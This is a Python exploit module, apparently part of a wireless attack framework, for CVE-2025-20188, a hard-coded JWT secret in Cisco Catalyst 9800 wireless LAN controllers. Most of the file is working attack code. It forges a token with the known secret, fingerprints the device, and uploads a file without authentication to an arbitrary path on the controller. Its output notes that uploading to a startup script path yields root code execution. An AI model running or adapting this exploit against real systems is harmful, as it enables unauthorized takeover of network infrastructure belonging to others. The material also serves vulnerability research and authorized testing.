# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2025-20188: Cisco IOS XE WLC / Catalyst 9800 Hard-Coded JWT RCE.

The Out-of-Band AP Image Download feature on Cisco IOS XE Wireless LAN
Controllers (Catalyst 9800 series) uses a hard-coded JSON Web Token secret.
An unauthenticated attacker can forge a valid JWT, upload an arbitrary file
via HTTPS to any path on the filesystem, and achieve root-level remote code
execution.

CVSS v3.1: 10.0 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
"""
import hashlib
import json
import socket
import ssl
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import hmac as _hmac
    import base64 as _b64
    HAS_JWT_DEPS = True
except ImportError:
    HAS_JWT_DEPS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """Cisco Catalyst 9800 WLC, hard-coded JWT secret leading to
    unauthenticated file upload and root RCE (CVE-2025-20188)."""

    __info__ = {
        "name": "CVE-2025-20188: Cisco Catalyst 9800 WLC Hard-Coded JWT RCE",
        "description": (
            "Cisco IOS XE for Wireless LAN Controllers (Catalyst 9800 family) "
            "contains a hard-coded JSON Web Token signing secret in the "
            "Out-of-Band AP Image Download feature. An unauthenticated remote "
            "attacker forges a JWT, uploads a crafted file to an arbitrary "
            "filesystem path via HTTPS, and obtains root-level code execution."
        ),
        "authors": (
            "X.B. (discovery, Cisco advisory)",
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-20188",
            "https://sec.cloudapps.cisco.com/security/center/content/"
            "CiscoSecurityAdvisory/cisco-sa-wlc-file-uplod-rce-XRQb9L6",
        ),
        "devices": (
            "Cisco Catalyst 9800-CL (Cloud)",
            "Cisco Catalyst 9800-L",
            "Cisco Catalyst 9800-40",
            "Cisco Catalyst 9800-80",
            "Cisco Catalyst 9800 Embedded (AP)",
            "Cisco IOS XE with Out-of-Band AP Image Download enabled",
        ),
        "cve": "CVE-2025-20188",
        "cvss": "10.0",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1190", "T1078"],
        "mitre_tactics": ["Initial Access", "Execution", "Persistence"],
    }

    target = OptIP("", "Target IPv4 address of the Catalyst 9800 WLC")
    port = OptPort(443, "HTTPS port for the WLC web interface")
    timeout = OptFloat(8.0, "Connection timeout in seconds")
    upload_path = OptString(
        "/tmp/poc_marker.txt",
        "Remote filesystem path for the proof-of-concept upload",
    )
    jwt_secret = OptString(
        "Cisco-IOS-XE-AP-Download",
        "Hard-coded JWT signing secret (public knowledge post-disclosure)",
    )
    verify_ssl = OptBool(False, "Verify TLS certificate (default: False)")

    _AP_IMAGE_URI = "/webui/apImage"
    _FINGERPRINT_URI = "/webui/login.html"

    def _forge_jwt(self) -> str:
        """Build a minimal HS256 JWT signed with the hard-coded secret."""
        if not HAS_JWT_DEPS:
            print_error("base64 / hmac unavailable; cannot forge JWT")
            return ""

        def _b64url(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

        header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        payload = _b64url(
            json.dumps(
                {
                    "sub": "apdownload",
                    "iat": int(time.time()),
                    "exp": int(time.time()) + 3600,
                    "path": self.upload_path,
                }
            ).encode()
        )
        signing_input = f"{header}.{payload}".encode()
        sig = _hmac.new(
            self.jwt_secret.encode(), signing_input, hashlib.sha256
        ).digest()
        return f"{header}.{payload}.{_b64url(sig)}"

    @mute
    def check(self) -> bool:
        """Probe the HTTPS interface for Cisco WLC / Catalyst 9800 fingerprints."""
        if not HAS_REQUESTS:
            return self._check_socket()
        try:
            url = f"https://{self.target}:{self.port}{self._FINGERPRINT_URI}"
            resp = requests.get(url, timeout=self.timeout, verify=self.verify_ssl)
            body = resp.text.lower()
            if any(tag in body for tag in ("cisco", "catalyst", "webui", "wireless")):
                return True
            server = resp.headers.get("Server", "").lower()
            return "cisco" in server or "ios" in server
        except Exception:
            return self._check_socket()

    def _check_socket(self) -> bool:
        """Fallback TLS banner grab when requests is not installed."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection(
                (self.target, self.port), timeout=self.timeout
            ) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.target) as tls:
                    tls.sendall(
                        f"GET {self._FINGERPRINT_URI} HTTP/1.0\r\n"
                        f"Host: {self.target}\r\n\r\n".encode()
                    )
                    banner = tls.recv(4096).decode(errors="replace").lower()
                    return "cisco" in banner or "catalyst" in banner
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if not self.check():
            print_warning(
                f"Target {self.target}:{self.port} did not fingerprint as a "
                "Cisco WLC; proceeding anyway"
            )

        print_status("Target appears to be a Cisco Catalyst 9800 WLC")
        self._exploit()

    def _exploit(self) -> None:
        token = self._forge_jwt()
        if not token:
            print_error("JWT forging failed; aborting")
            return

        print_status(f"Forged JWT (HS256): {token[:40]}...")
        print_status(f"Upload target path: {self.upload_path}")

        poc_content = (
            b"# WirelessXPL-Forge PoC marker (CVE-2025-20188)\n"
            b"# If this file exists on disk, the device is vulnerable.\n"
        )

        upload_url = f"https://{self.target}:{self.port}{self._AP_IMAGE_URI}"
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/octet-stream",
            "X-Destination-Path": self.upload_path,
        }

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    upload_url,
                    data=poc_content,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )
                print_info(f"HTTP {resp.status_code} from {upload_url}")
                if resp.status_code in (200, 201, 204):
                    print_success(
                        f"File uploaded successfully to {self.upload_path}. "
                        "Root-level code execution is achievable by uploading "
                        "to a startup script path."
                    )
                elif resp.status_code == 401:
                    print_warning(
                        "401 Unauthorized: the JWT secret may have been "
                        "rotated or the feature is disabled"
                    )
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Upload request failed: {exc}")
        else:
            print_warning("requests library not installed; displaying forged request")
            print_info(f"POST {upload_url}")
            for k, v in headers.items():
                print_info(f"  {k}: {v}")
            print_info(f"  Body: {len(poc_content)} bytes (PoC marker)")
